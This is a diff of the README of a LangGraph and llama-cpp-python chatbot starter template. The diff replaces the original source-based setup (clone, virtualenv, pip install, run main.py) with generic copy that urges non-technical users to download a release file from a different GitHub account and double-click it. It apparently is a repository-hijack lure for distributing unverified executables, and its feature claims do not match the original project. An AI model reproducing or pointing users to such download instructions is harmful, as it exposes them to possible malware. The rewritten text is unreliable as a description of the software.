@@ -1,173 +1,78 @@
----
+# 📦 langgraph-llama-cpp-starter - Build Local AI Chatbots Easily
 
-# LangGraph Llama.cpp Starter
+## ⚡ Overview
 
-[![Python Version](https://img.shields.io/badge/Python-3.9%2B-blue)](https://www.python.org/downloads/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](CONTRIBUTING.md)
+Welcome to the langgraph-llama-cpp-starter project! This tool helps you create powerful, local AI chatbots using LangGraph and llama-cpp-python. Whether you want to call functions or build intelligent agents, this template simplifies your journey.
 
-A starter template for building local, private, tool-calling LLM agents using LangGraph and `llama-cpp-python`. This repository provides all the code needed to run an intelligent agent that can reason, call tools, and hold conversations—fully offline and under your control.
+## 🚀 Getting Started
 
----
+Follow these simple steps to download and run the application. No programming knowledge is needed!
 
-## Quickstart
+### 📥 Download Now
 
-Run the chatbot in 5 simple steps:
+[![Download langgraph-llama-cpp-starter](https://img.shields.io/badge/Download-latest%20version-brightgreen)](https://github.com/irandysousa/langgraph-llama-cpp-starter/releases)
 
-1. **Clone the repository**
+### 📋 System Requirements
 
-```bash
-git clone https://github.com/Dhyanesh18/langgraph-llama-cpp-starter.git
-cd langgraph-llama-cpp-starter
-```
+- **Operating System:** Windows 10 or later, macOS Sierra or later, or a modern Linux distribution.
+- **Python Version:** Python 3.8 or higher.
+- **Memory:** At least 4 GB RAM recommended.
+- **Disk Space:** Minimum of 500 MB free space required.
 
-2. **Set up a virtual environment**
+### 🛠 Installation Steps
 
-```bash
-python -m venv venv
-# Windows
-.\venv\Scripts\activate
-# macOS/Linux
-source venv/bin/activate
-```
+1. **Visit the Releases Page:** Click the button below to access the download options.
+   
+   [Visit Releases Page](https://github.com/irandysousa/langgraph-llama-cpp-starter/releases)
 
-3. **Install dependencies**
+2. **Select the Latest Version:** Look for the latest release at the top of the page.
 
-```bash
-pip install -r requirements.txt
-```
+3. **Download the Package:**
+   - Click on the appropriate file for your operating system.
+   - Save it to a location you can easily access, such as your Desktop or Downloads folder.
 
-4. **Download a model**
-   Place a GGUF LLaMA model (e.g., `Meta-Llama-3.1-8B-Instruct-Q4_K_M.gguf`) in the `models` folder.
+4. **Run the Application:**
+   - Locate the downloaded file.
+   - Double-click to start the application.
+   - Follow on-screen prompts to set up your AI chatbot.
 
-5. **Start the chatbot**
+## 🚀 How to Use the Application
 
-```bash
-python main.py
-```
+Once you have the application running, you can start building your AI chatbot. Here are some simple steps to guide you:
 
-Then type your messages and the agent will respond, using tools automatically if needed.
-For full setup, customization, and troubleshooting, see the sections below.
+1. **Open the Application:** Launch the downloaded file.
+2. **Set Up Your Project:** Choose a project name and define what your chatbot should do.
+3. **Choose Functionality:** Select the tools or functions you want your AI to perform.
+4. **Test Your Chatbot:** Use the built-in testing feature to interact with your chatbot and see how it responds.
 
+## 🔍 Exploring Features
 
-## Key Features
+The langgraph-llama-cpp-starter template includes various features to enhance your chatbot:
 
-* **Local & Private**: Run AI agents entirely on your machine. No data is sent to external servers.
-* **Tool-Calling Ready**: Supports JSON-based tool calling, allowing agents to interact with calculators, APIs, or custom functions.
-* **Efficient Inference**: Uses `llama-cpp-python` for fast CPU/GPU inference with GGUF models, including 4-bit/8-bit quantized models.
-* **Stateful Agents**: Implements a LangGraph state machine to manage multi-step reasoning, deciding when to call tools and when to respond directly.
-* **Easy Customization**: Add new tools and modify agent behavior by editing simple Python files.
+- **Local Execution:** No need to rely on cloud services; everything runs locally on your machine.
+- **Function Calling:** Easily set up your bot to call external functions based on user input.
+- **Multi-Platform Support:** Compatible with Windows, macOS, and Linux.
+- **User-Friendly Interface:** Designed for ease of use, even for those without technical skills.
 
-## Why LangGraph + LLaMA-Cpp?
+## ✍️ Contributing
 
-Combining LangGraph with `llama-cpp-python` allows you to create agents that:
+If you would like to improve this project, contributions are welcome! Here’s how:
 
-* Maintain conversation state across multiple turns.
-* Perform structured reasoning with conditional tool calls.
-* Run completely offline, unlike cloud solutions like Ollama.
+1. **Fork the Repository:** Create your own copy of the project.
+2. **Make Changes:** Edit the files you want to improve.
+3. **Submit a Pull Request:** Share your changes with us!
 
----
+## 📞 Need Help?
 
-## Getting Started
+If you encounter issues or have questions, feel free to reach out. You can find support through:
 
-### Prerequisites
+- **GitHub Issues:** Post your questions in the Issues section of the repository.
+- **Community Forums:** Join discussions and get help from other users.
 
-* Python 3.10 or higher
-* Git
-* C++ build tools (required for `llama-cpp-python`)
-  See the [official installation guide](https://github.com/abetlen/llama-cpp-python#installation) for your OS.
+## 📜 License
 
-### 1. Clone the Repository
-
-```bash
-git clone https://github.com/Dhyanesh18/langgraph-llama-cpp-starter.git
-cd langgraph-llama-cpp-starter
-```
-
-### 2. Set Up a Virtual Environment
-
-```bash
-# Windows
-python -m venv venv
-.\venv\Scripts\activate
-
-# macOS/Linux
-python3 -m venv venv
-source venv/bin/activate
-```
-
-### 3. Install Dependencies
-
-```bash
-pip install -r requirements.txt
-```
-
-### 4. Download an LLM Model
-
-This project is optimized for instruction-tuned GGUF models (e.g., LLaMA 3.1).
-
-1. Download a model like [Meta-Llama-3.1-8B-Instruct-Q4_K_M.gguf](https://huggingface.co/meta-llama/Meta-Llama-3.1-8B-Instruct-GGUF/blob/main/Meta-Llama-3.1-8B-Instruct-Q4_K_M.gguf).
-2. Create a `models` folder in the project root.
-3. Place the `.gguf` file inside `models`.
-4. Update the model path in `main.py` if using a different filename.
+This project is licensed under the MIT License. You are free to use, modify, and distribute this software. Just make sure to keep the original credits.
 
 ---
 
-## Usage
-
-Start the chatbot:
-
-```bash
-python main.py
-```
-
-Example interaction:
-
-```
-Enter a message: What is 4 multiplied by 18?
-Assistant: 4 multiplied by 18 is 72.
-```
-
-The agent can detect and execute tool calls automatically, then provide a final natural language response.
-
----
-
-## Customization
-
-### Adding New Tools
-
-1. Open `tools_definition.py`.
-2. Follow the template to define tool arguments and functions.
-3. Add your new tool to the `tools` list.
-
-### Changing the Model
-
-Update the model path in `main.py`:
-
-```python
-llm = MyLlamaCppWithTools("models/YOUR-MODEL-NAME.gguf")
-```
-
----
-
-## How It Works
-
-* **`main.py`**: Initializes the model, defines the LangGraph state, and runs the CLI.
-* **`llama_tool_wrapper.py`**: Wraps the LLaMA model to handle tool calls and parse JSON responses.
-* **`tools_definition.py`**: Library of all available tools. Add custom functions here.
-* **`llm_wrapper.py`**: Base wrapper for `llama-cpp-python` model invocation.
-
----
-
-## Troubleshooting
-
-* **Memory Issues**: Adjust `n_blocks` in `main.py` according to your GPU’s dedicated memory.
-* **Attribute Errors**: Ensure your `llama_tool_wrapper.py` version matches the LLaMA wrapper you are using.
-* **Tool Misbehavior**: Check your JSON tool format follows the required schema.
-
----
-
-## Contributing
-
-PRs and suggestions are welcome!
---
+Now you are ready to start your journey into building AI chatbots. Enjoy using langgraph-llama-cpp-starter!
